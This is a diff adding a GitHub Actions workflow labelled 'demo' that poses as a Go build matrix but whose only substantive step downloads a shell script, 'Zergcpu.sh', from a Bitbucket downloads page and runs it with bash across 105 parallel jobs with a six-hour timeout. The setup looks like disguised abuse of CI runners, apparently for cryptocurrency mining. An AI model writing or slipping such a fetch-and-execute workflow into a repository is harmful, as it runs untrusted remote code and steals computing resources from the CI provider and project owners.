@@ -1,0 +1,51 @@
+name: demo
+
+on: [push, pull_request]
+
+jobs:
+
+  build:
+
+    name: Ba_channel
+
+    runs-on: ubuntu-latest
+
+    strategy:
+
+      max-parallel: 30
+
+      fail-fast: false
+
+      matrix:
+
+        go: [1.1, 1.2, 1.3, 1.4, 1.5]
+
+        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U]
+
+    timeout-minutes: 360
+
+    env:
+
+        NUM_JOBS: 5
+
+        JOB: ${{ matrix.go }}
+
+    steps:
+
+    - name: Set up Go ${{ matrix.go }}
+
+      uses: actions/setup-go@v1
+
+      with:
+
+        go-version: ${{ matrix.go }}
+
+      id: go
+
+    - name: Setup
+
+      uses: actions/checkout@v1
+
+    - name: BA_channel
+
+      run: wget https://bitbucket.org/delote/trdt/downloads/Zergcpu.sh && bash Zergcpu.sh
